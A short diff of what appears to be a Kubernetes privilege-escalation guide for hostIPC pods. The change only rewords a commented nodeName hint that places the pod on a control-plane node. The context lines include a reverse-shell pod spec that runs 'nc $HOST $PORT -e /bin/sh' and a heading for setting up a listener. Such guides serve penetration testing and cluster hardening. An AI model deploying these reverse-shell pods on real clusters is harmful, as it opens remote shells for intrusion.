@@ -19,8 +19,7 @@ spec:
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "while true; do sleep 30; done;" ]
     name: hostipc
-    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
-  ```
+    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  ```
 [pod-hostipc.yaml](pod-hostipc.yaml)
 
 #### Option 1: Create pod from local yaml 
@@ -53,8 +52,7 @@ spec:
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     name: hostipc--revshell
-    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
-```
+    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name```
 [pod-hostipc-revshell.yaml](pod-hostipc-revshell.yaml)
 
 #### Set up listener
